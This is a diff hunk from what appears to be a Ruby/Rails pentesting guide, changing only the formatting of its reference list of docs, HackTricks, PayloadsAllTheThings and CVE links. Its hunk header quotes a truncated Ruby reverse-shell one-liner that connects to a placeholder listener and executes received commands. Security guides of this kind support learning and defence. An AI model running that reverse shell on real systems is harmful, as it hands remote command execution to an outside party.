@@ -300,17 +300,17 @@ ruby -rsocket -e 'c=TCPSocket.new("<LHOST>","<LPORT>");while(cmd=c.gets);IO.pope
 
 ## 8. References
 
-- Ruby official docs: https://www.ruby-lang.org/en/documentation/
-- Rails official docs: https://guides.rubyonrails.org/
-- HackTricks - Ruby: https://book.hacktricks.xyz/pentesting-web/deserialization
-- PayloadsAllTheThings - Ruby: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Deserialization/Ruby%20Deserialization.md
-- CVE-2013-0156: https://nvd.nist.gov/vuln/detail/CVE-2013-0156
-- CVE-2016-0752: https://nvd.nist.gov/vuln/detail/CVE-2016-0752
-- CVE-2018-3760: https://nvd.nist.gov/vuln/detail/CVE-2018-3760
-- CVE-2019-5418: https://nvd.nist.gov/vuln/detail/CVE-2019-5418
-- CVE-2019-5420: https://nvd.nist.gov/vuln/detail/CVE-2019-5420
-- CVE-2020-8163: https://nvd.nist.gov/vuln/detail/CVE-2020-8163
-- CVE-2022-32224: https://nvd.nist.gov/vuln/detail/CVE-2022-32224
-- CVE-2025-23091: https://nvd.nist.gov/vuln/detail/CVE-2025-23091
+- Ruby official docs - https://www.ruby-lang.org/en/documentation/
+- Rails official docs - https://guides.rubyonrails.org/
+- HackTricks - Ruby - https://book.hacktricks.xyz/pentesting-web/deserialization
+- PayloadsAllTheThings - Ruby - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Deserialization/Ruby%20Deserialization.md
+- CVE-2013-0156 - https://nvd.nist.gov/vuln/detail/CVE-2013-0156
+- CVE-2016-0752 - https://nvd.nist.gov/vuln/detail/CVE-2016-0752
+- CVE-2018-3760 - https://nvd.nist.gov/vuln/detail/CVE-2018-3760
+- CVE-2019-5418 - https://nvd.nist.gov/vuln/detail/CVE-2019-5418
+- CVE-2019-5420 - https://nvd.nist.gov/vuln/detail/CVE-2019-5420
+- CVE-2020-8163 - https://nvd.nist.gov/vuln/detail/CVE-2020-8163
+- CVE-2022-32224 - https://nvd.nist.gov/vuln/detail/CVE-2022-32224
+- CVE-2025-23091 - https://nvd.nist.gov/vuln/detail/CVE-2025-23091
 
 ---
